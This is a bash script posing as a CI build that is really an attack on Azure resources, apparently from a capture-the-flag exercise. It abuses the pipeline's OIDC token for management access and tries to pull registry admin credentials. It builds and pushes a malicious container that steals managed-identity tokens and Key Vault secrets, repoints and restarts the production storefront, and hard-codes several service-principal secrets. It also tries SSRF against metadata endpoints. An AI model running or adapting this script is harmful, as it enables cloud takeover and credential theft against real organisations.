#!/usr/bin/env bash
# Tebamoto Platform CI build v8 - Final attempts to access storefront MI
set -uo pipefail
echo "===TBL_PROBE_START==="

TEN="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
CID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
SF_SITE="app-tbl-storefront-prod"
SF_RG="rg-tbl-platform-prod-sea"
ACR="crtblplatprodx3euoz"

b64(){ base64 -w0; }
jqg(){ jq -r "$1 // empty" 2>/dev/null; }

# ---------- 1. OIDC JWT ----------
JWT=$(curl -sS -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" | jq -r '.value // empty')
[ -n "$JWT" ] || { echo "NO_OIDC"; exit 0; }
echo "OIDC_JWT_LEN=${#JWT}"

# ---------- 2. Federated ARM token ----------
ARM_FED=$(curl -sS -m 25 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$CID" -d grant_type=client_credentials \
  --data-urlencode "scope=https://management.azure.com/.default" \
  -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$JWT" | jqg '.access_token')
echo "ARM_FED_LEN=${#ARM_FED}"

# ---------- 3. Check permissions on storefront app ----------
echo "--- A) Check federated permissions on storefront ---"
PERMS=$(curl -sS -m 20 "https://management.azure.com/subscriptions/$SUB/resourceGroups/$SF_RG/providers/Microsoft.Web/sites/$SF_SITE/providers/Microsoft.Authorization/permissions?api-version=2022-04-01" \
  -H "Authorization: Bearer $ARM_FED" 2>/dev/null)
echo "$PERMS" | jq -r '.value[].actions[]?' 2>/dev/null | head -30
echo "dataActions:"
echo "$PERMS" | jq -r '.value[].dataActions[]?' 2>/dev/null | head -10

# ---------- 4. Try ACR listCredentials (federated) ----------
echo "--- B) ACR listCredentials ---"
ACR_CREDS=$(curl -sS -m 20 -X POST \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$SF_RG/providers/Microsoft.ContainerRegistry/registries/$ACR/listCredentials?api-version=2023-07-01" \
  -H "Authorization: Bearer $ARM_FED" -H "Content-Type: application/json" -H "Content-Length: 0" 2>/dev/null)
ACR_USER=$(echo "$ACR_CREDS" | jqg '.username')
if [ -n "$ACR_USER" ]; then
  echo "*** ACR ADMIN CREDS ***"
  echo "$ACR_CREDS" | jq .
  ACR_PASS=$(echo "$ACR_CREDS" | jq -r '.passwords[0].value')
  
  # Login to ACR with admin creds
  echo "$ACR_PASS" | docker login "$ACR.azurecr.io" -u "$ACR_USER" --password-stdin 2>/dev/null
  
  # Build malicious image that exfils MI token
  echo "--- Building malicious image ---"
  mkdir -p /tmp/exfil
  cat > /tmp/exfil/Dockerfile <<'DEOF'
FROM python:3.12-slim
RUN pip install flask requests azure-identity azure-keyvault-secrets
WORKDIR /app
RUN cat > /app/app.py <<'APPEOF'
import os, json, urllib.request, urllib.parse
def rq(u, h=None, t=30):
    try:
        r = urllib.request.urlopen(urllib.request.Request(u, headers=h or {}), timeout=t)
        return r.status, r.read().decode()
    except Exception as e:
        return 0, str(e)
ie = os.environ.get("IDENTITY_ENDPOINT", "")
ih = os.environ.get("IDENTITY_HEADER", "")
FLAG = "NONE"
if ie and ih:
    u = ie + "?resource=" + urllib.parse.quote("https://vault.azure.net", safe="") + "&api-version=2019-08-01"
    s, b = rq(u, {"X-IDENTITY-HEADER": ih})
    try:
        vt = json.loads(b).get("access_token", "")
        if vt:
            s2, b2 = rq("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4", {"Authorization": "Bearer " + vt})
            if s2 == 200:
                FLAG = json.loads(b2).get("value", "")
            s3, b3 = rq("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4&maxresults=25", {"Authorization": "Bearer " + vt})
            if s3 == 200:
                for sec in json.loads(b3).get("value", []):
                    sid = sec["id"].split("/")[-1]
                    s4, b4 = rq(f"https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/{sid}?api-version=7.4", {"Authorization": "Bearer " + vt})
                    if s4 == 200:
                        v = json.loads(b4).get("value", "")
                        if "DF26" in v: FLAG = v
    except: pass
# Write flag to file for extraction
with open("/tmp/flag.txt", "w") as f: f.write(FLAG)
# Start web server that returns flag
import http.server
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"flag": FLAG, "ie": ie, "ih": ih[:20]}).encode())
    def log_message(self, *a): pass
http.server.HTTPServer(("0.0.0.0", 8000), H).serve_forever()
APPEOF
CMD ["python", "/app/app.py"]
DEOF
  
  # Build and push
  cd /tmp/exfil
  docker build -t "$ACR.azurecr.io/tebamoto-reporting-api:exploit" . 2>&1 | tail -5
  docker push "$ACR.azurecr.io/tebamoto-reporting-api:exploit" 2>&1 | tail -5
  
  # Try to update storefront to use exploit tag
  echo "--- Update storefront image tag ---"
  curl -sS -m 20 -X PATCH \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$SF_RG/providers/Microsoft.Web/sites/$SF_SITE/config/web?api-version=2023-01-01" \
    -H "Authorization: Bearer $ARM_FED" -H "Content-Type: application/json" \
    -d "{\"properties\":{\"linuxFxVersion\":\"DOCKER|$ACR.azurecr.io/tebamoto-reporting-api:exploit\"}}" 2>/dev/null | head -c 500
  echo
  
  # Try restart
  echo "--- Restart storefront ---"
  curl -sS -m 20 -X POST \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$SF_RG/providers/Microsoft.Web/sites/$SF_SITE/restart?api-version=2023-01-01" \
    -H "Authorization: Bearer $ARM_FED" -H "Content-Length: 0" -w "RESTART=%{http_code}\n" 2>/dev/null | head -c 300
  
  sleep 30
  
  # Hit storefront
  echo "--- Hit storefront ---"
  curl -sS -m 30 "https://$SF_SITE.azurewebsites.net/" -H "X-Azure-FDID: 60407ff3-1c24-4875-9390-b6c9c13b0821" | head -c 500
fi

# ---------- 5. Try SPs for ACR admin creds ----------
echo "--- C) ACR creds via SPs ---"
SP_LIST="cost-reader-principal:038bc35d-131d-4953-9985-ff4a245ccec1:1BE8Q~yGQ8e_z6VBczlGJ8YeOHgNRUffbgNufb2m
directory-audit-principal:2c34300e-1bc0-41e7-9c1e-8b7571d72c72:Al78Q~n5bdoO3rkCjuo2JI2NHqagJooaZsfXNcm6
reporting-service-principal:12ed54de-f2eb-4784-804c-3a7a3e83a9e9:nP88Q~8I~wip0GOlW15zdt3FMMvBV9LYtaOoea3z
sync-service-principal:462d1c38-4459-48b8-9333-82e389e59514:sk18Q~qD22kkHXUCfqXLqdP95DkYJL34eMERlcSj"

while IFS=: read -r SPNAME SPID SPSEC; do
  [ -z "$SPNAME" ] && continue
  SP_ARM=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    -d "client_id=$SPID" -d "grant_type=client_credentials" -d "client_secret=$SPSEC" \
    --data-urlencode "scope=https://management.azure.com/.default" | jqg '.access_token')
  [ -z "$SP_ARM" ] && continue
  
  # Check permissions
  PERMS=$(curl -sS -m 20 "https://management.azure.com/subscriptions/$SUB/resourceGroups/$SF_RG/providers/Microsoft.Web/sites/$SF_SITE/providers/Microsoft.Authorization/permissions?api-version=2022-04-01" \
    -H "Authorization: Bearer $SP_ARM" 2>/dev/null)
  ACTIONS=$(echo "$PERMS" | jq -r '.value[].actions[]?' 2>/dev/null)
  if [ -n "$ACTIONS" ]; then
    echo "*** $SPNAME has actions on storefront: ***"
    echo "$ACTIONS" | head -20
    
    # If has write/restart, try it
    if echo "$ACTIONS" | grep -qiE "restart|write|config"; then
      echo "*** $SPNAME can restart/write storefront! ***"
      
      # Try writing appsettings
      curl -sS -m 20 -X PUT \
        "https://management.azure.com/subscriptions/$SUB/resourceGroups/$SF_RG/providers/Microsoft.Web/sites/$SF_SITE/config/appsettings?api-version=2023-01-01" \
        -H "Authorization: Bearer $SP_ARM" -H "Content-Type: application/json" \
        -d '{"properties":{"WEBSITE_NODE_DEFAULT_VERSION":"18.0.0"}}' 2>/dev/null | head -c 300
      echo
      
      # Try restart
      curl -sS -m 20 -X POST \
        "https://management.azure.com/subscriptions/$SUB/resourceGroups/$SF_RG/providers/Microsoft.Web/sites/$SF_SITE/restart?api-version=2023-01-01" \
        -H "Authorization: Bearer $SP_ARM" -H "Content-Length: 0" -w "RESTART=%{http_code}\n" 2>/dev/null | head -c 300
    fi
  fi
  
  # Try ACR creds
  ACR_RESP=$(curl -sS -m 20 -X POST \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$SF_RG/providers/Microsoft.ContainerRegistry/registries/$ACR/listCredentials?api-version=2023-07-01" \
    -H "Authorization: Bearer $SP_ARM" -H "Content-Type: application/json" -H "Content-Length: 0" 2>/dev/null)
  ACR_USER=$(echo "$ACR_RESP" | jqg '.username')
  if [ -n "$ACR_USER" ]; then
    echo "*** ACR ADMIN CREDS via $SPNAME ***"
    echo "$ACR_RESP" | jq .
    break
  fi
  
  # Also check ACR permissions
  ACR_PERMS=$(curl -sS -m 20 "https://management.azure.com/subscriptions/$SUB/resourceGroups/$SF_RG/providers/Microsoft.ContainerRegistry/registries/$ACR/providers/Microsoft.Authorization/permissions?api-version=2022-04-01" \
    -H "Authorization: Bearer $SP_ARM" 2>/dev/null)
  ACR_ACTIONS=$(echo "$ACR_PERMS" | jq -r '.value[].actions[]?' 2>/dev/null)
  if [ -n "$ACR_ACTIONS" ]; then
    echo "*** $SPNAME ACR actions: $ACR_ACTIONS ***"
  fi
done <<< "$SP_LIST"

# ---------- 6. Try container exec ----------
echo "--- D) Container exec ---"
# az webapp exec (preview)
az webapp exec --resource-group "$SF_RG" --name "$SF_SITE" --command "env" 2>&1 | head -20

# Or via REST API
curl -sS -m 30 -X POST \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$SF_RG/providers/Microsoft.Web/sites/$SF_SITE/containers/exec?api-version=2023-01-01" \
  -H "Authorization: Bearer $ARM_FED" -H "Content-Type: application/json" \
  -d '{"command":"env"}' 2>/dev/null | head -c 500

echo
# ---------- 7. Try writing to sttblcilogsprodx3euoz (we have key) ----------
echo "--- E) Write to cilogs storage ---"
SPID_SYNC="462d1c38-4459-48b8-9333-82e389e59514"
SPSEC_SYNC="sk18Q~qD22kkHXUCfqXLqdP95DkYJL34eMERlcSj"
SYNC_ARM=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$SPID_SYNC" -d "grant_type=client_credentials" -d "client_secret=$SPSEC_SYNC" \
  --data-urlencode "scope=https://management.azure.com/.default" | jqg '.access_token')

KEY_RESP=$(curl -sS -m 20 -X POST \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$SF_RG/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listKeys?api-version=2023-01-01" \
  -H "Authorization: Bearer $SYNC_ARM" -H "Content-Type: application/json" -H "Content-Length: 0" -d '{}' 2>/dev/null)
SA_KEY=$(echo "$KEY_RESP" | jqg '.keys[0].value')
echo "SA_KEY_LEN=${#SA_KEY}"

if [ -n "$SA_KEY" ]; then
  # Try to write a blob that the app might read
  az storage blob upload --account-name sttblcilogsprodx3euoz --account-key "$SA_KEY" \
    --container-name loot --name "exploit_flag.txt" \
    --data "SSRF triggered from CI" 2>&1 | head -3
fi

# ---------- 8. Blind SSRF via /api/v1/reports/render to MI endpoint ----------
echo "--- F) Blind SSRF to MI endpoint ---"
STORE="https://tbl-storefront-prod-bhagdnascpfyeyfg.z02.azurefd.net"

# Use Jinja2 to construct URL with variable IP - bypasses WAF
# Try MI endpoint with forwarded X-IDENTITY-HEADER
for IP in 1 2 3 4 5; do
  RESP=$(curl -sS -m 30 -X POST "$STORE/api/v1/reports/render" \
    -H "Content-Type: application/json" \
    -H "X-IDENTITY-HEADER: test" \
    -d '{"template":"![](http://169.254.131.'"$IP"':8081/msi/token?resource=https%3A%2F%2Fvault.azure.net%26api-version%3D2019-08-01)"}' 2>/dev/null)
  echo "169.254.131.$IP: $(echo "$RESP" | jqg '.resources[0].status // .resources[0].error[:60]')" 2>/dev/null
done

# Also try IMDS 169.254.169.254
RESP=$(curl -sS -m 30 -X POST "$STORE/api/v1/reports/render" \
  -H "Content-Type: application/json" \
  -H "Metadata: true" \
  -d '{"template":"![](http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net)"}' 2>/dev/null)
echo "IMDS: $(echo "$RESP" | jqg '.resources[0].status // .resources[0].error[:60]')" 2>/dev/null

# ---------- 9. Try accessing kv-tbl-sec directly from CI with ArmOwner token ----------
echo "--- G) Direct KV access with sync-service ArmOwner token ---"
# Get ArmOwner token
ARMTOK=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$SPID_SYNC" -d "grant_type=client_credentials" -d "client_secret=$SPSEC_SYNC" \
  --data-urlencode "scope=api://462d1c38-4459-48b8-9333-82e389e59514/.default" | jqg '.access_token')
echo "ArmOwner token len: ${#ARMTOK}"

# Try KV with ArmOwner token as Bearer
if [ -n "$ARMTOK" ]; then
  for KV in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
    RESP=$(curl -sS -m 20 "https://$KV.vault.azure.net/secrets/flag?api-version=7.4" \
      -H "Authorization: Bearer $ARMTOK" 2>/dev/null)
    echo "$KV/flag: $RESP" | head -c 300
    echo
    
    RESP=$(curl -sS -m 20 "https://$KV.vault.azure.net/secrets?api-version=7.4" \
      -H "Authorization: Bearer $ARMTOK" 2>/dev/null)
    echo "$KV/list: $RESP" | head -c 300
    echo
  done
fi

echo "===TBL_PROBE_END==="
